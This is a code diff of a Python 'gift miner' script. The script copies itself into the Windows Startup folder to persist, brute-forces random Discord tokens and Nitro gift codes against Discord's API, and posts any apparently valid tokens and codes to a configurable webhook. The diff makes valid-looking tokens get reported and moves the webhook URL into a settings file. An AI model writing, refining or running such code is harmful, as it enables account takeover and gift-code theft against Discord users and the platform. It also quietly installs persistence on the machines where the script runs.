@@ -1,22 +1,23 @@
+from unittest import expectedFailure
+from config import setting
+
+URLWEBHOOK = f"{setting.url}"
+
 #         _    __   _   
 #  __ _  (_)  / _| | |_ 
 # / _` | | | |  _| |  _|
 # \__, | |_| |_|    \__|
 # |___/                 
-#                 _                    
-#  _ __    __ _  (_)  _ _    ___   _ _ 
-# | '  \  / _` | | | | ' \  / -_) | '_|
-# |_|_|_| \__,_| |_| |_||_| \___| |_|  
+#                                    
+#  _ __   (_)  _ _    ___   _ _ 
+# | '  \  | | | ' \  / -_) | '_|
+# |_|_|_| |_| |_||_| \___| |_|  
                                       
 
 #badd
 
-
-URLWEBHOOK = "URL"
-
 import random
 import string
-from unittest import expectedFailure
 import requests
 import os, sys
 
@@ -34,7 +35,6 @@ def main(URLWEBHOOK):
 	if not os.path.exists(f"{user_path}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{Thisfile_name}"):
 		os.system(f'copy "{Thisfile}" "{user_path}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"')
 	
-	
 	try:
 		i = 0
 		valid = 0
@@ -48,11 +48,9 @@ def main(URLWEBHOOK):
 		response = webhook.execute()
 
 		while True:
-
-
 			it +=1
 			TokenChars = "QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbm0123456789-_"
-						
+							
 
 
 			one = ''.join((random.choice(TokenChars) for i in range(24)))
@@ -64,29 +62,29 @@ def main(URLWEBHOOK):
 			response = post(f'https://discord.com/api/v6/invite/{randint(1,9999999)}', headers={'Authorization': token})
 
 			if response.status_code == 401:
-				webhook = DiscordWebhook(url=f'{URLWEBHOOK}', content=f'|{token}| - valid | Invalid - |{it}|')
-				response = webhook.execute()
+				it += 1
 			elif "You need to verify your account in order to perform this action." in str(response.content):
 				it += 1
 			else:
-				it += 1
+				webhook = DiscordWebhook(url=f'{URLWEBHOOK}', content=f'||{token}|| - valid | Invalid - ||{it}||')
+				response = webhook.execute()
 
 			code = "".join(random.choices(string.ascii_uppercase + string.digits + string.ascii_lowercase,k = 16))
-						
+							
 			nitro = "https://discord.gift/" + code
 			r = requests.get(f"https://discordapp.com/api/v9/entitlements/gift-codes/{nitro}?with_application=false&with_subscription_plan=true")
 
 			i += 1
 
 			if r.status_code == 200:
-				webhook = DiscordWebhook(url=f'{URLWEBHOOK}', content=f'{nitro}')
+				webhook = DiscordWebhook(url=f'{URLWEBHOOK}', content=f'||{nitro}||')
 				response = webhook.execute()
 				tvalid += 1
 			else:
 				tnovalid += 1
 				continue
 			if i == 10000:
-				webhook = DiscordWebhook(url=f'{URLWEBHOOK}', content=f'из {i} - {novalid} Invalid | {valid} Valid')
+				webhook = DiscordWebhook(url=f'{URLWEBHOOK}', content=f'из {i} - {novalid} Invalid | ||{valid}|| Valid')
 				response = webhook.execute()
 	except:
 		print(0/0)
